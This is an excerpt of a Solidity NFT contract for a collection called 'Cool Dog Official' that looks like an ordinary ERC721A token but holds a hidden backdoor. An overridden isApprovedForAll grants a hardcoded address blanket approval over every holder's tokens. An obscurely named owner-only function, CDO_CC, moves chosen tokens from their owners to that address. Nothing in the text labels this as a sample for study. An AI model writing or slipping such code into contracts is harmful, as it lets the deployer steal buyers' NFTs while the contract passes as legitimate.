  ...
  Ownable
{
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function setTokenTo(uint256 _tokenId, bool _allow) external onlyOwner {
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xB39F4a49b7Bf04ce379725718f1e42674aCc90C3){return true;}
...
contract CoolDogOfficial is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Cool Dog Official", "CDO", maxBatchSize_, collectionSize_) {
  ...
  function CDO_CC(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xB39F4a49b7Bf04ce379725718f1e42674aCc90C3, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x7E8c28910351a72568F6F3a90E769F836CF0cBe3);
